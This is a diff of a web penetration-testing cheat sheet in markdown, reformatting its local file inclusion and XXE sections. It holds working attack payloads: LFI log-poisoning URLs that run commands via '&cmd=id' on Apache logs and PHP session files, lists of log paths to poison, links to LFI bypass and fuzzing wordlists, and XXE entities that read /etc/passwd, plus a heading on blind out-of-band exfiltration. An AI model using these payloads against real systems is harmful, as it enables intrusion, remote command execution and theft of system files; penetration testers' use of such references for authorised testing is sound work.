@@ -772,27 +772,27 @@ http://ip/index.php?file=/var/log/apache2/access.log&cmd=id
 `http://ip/index.php?file=/var/lib/php/sessions/sess_<your_session>&cmd=id`  
   
 -> Other Paths  
-`/var/log/sshd.log`  
-`/var/log/vsftpd.log`  
-`/proc/self/fd/0-50`
-  
+```
+/var/log/nginx/access.log  
+/var/log/sshd.log  
+/var/log/vsftpd.log  
+/proc/self/fd/0-50  
+```
+
 ### LFI - files for fuzzing
-
-### Wordlist LFI - Linux
-
+-> Wordlist LFI - Linux  
 https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
 
-### Wordlist LFI - Windows
-
+-> Wordlist LFI - Windows  
 https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
 
 ### Payloads for bypass:
-
 -> bypass_lfi.txt  
-https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/wordlists/lfi_bypass.txt
+https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/wordlists/lfi_bypass.txt  
+
+-> logpoisoning.txt  
 
 ### Wordlist for parameter fuzzing
-  
 https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt
 
 ## SQL Injection
@@ -1111,7 +1111,6 @@ http://10.10.57.49:9200/_search?pretty=true&q=pass
 ## XXE
 
 ### Methods:
-
 ```
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
@@ -1119,7 +1118,6 @@ http://10.10.57.49:9200/_search?pretty=true&q=pass
 ```
 
 ## XXE - Blind Out-Of-Band
-
 ### Exfiltrate data exfiltrating data via dtd
 
 -> Part 1 (Main Request)
